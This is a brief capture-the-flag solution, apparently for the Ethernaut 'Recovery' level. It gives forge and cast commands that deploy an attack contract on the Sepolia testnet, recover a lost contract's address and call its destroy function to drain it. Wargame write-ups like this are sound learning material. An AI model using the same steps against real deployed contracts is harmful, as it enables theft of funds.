# Recovery Solution

Deploy:

```bash
forge create RecoveryHack --broadcast --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

Run to retrieve the `lostContractAddress`:

```bash
cast call <recoveryHackAddress> "attack(address)" <instanceAddress> --rpc-url $SEPOLIA_RPC_URL
# 0x0000000000000000000000001e08b6856bdf73e26747b197f2e5b1bef63af7c8
echo <lostContractAddress> | sed "s/0x000000000000000000000000/0x/"
# echo 0x0000000000000000000000001e08b6856bdf73e26747b197f2e5b1bef63af7c8 | sed "s/0x000000000000000000000000/0x/"
# 0x1e08b6856bdf73e26747b197f2e5b1bef63af7c8
```

Run:

```bash
cast send <lostContractAddress> "destroy(address)" sepoliaPublicKey --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
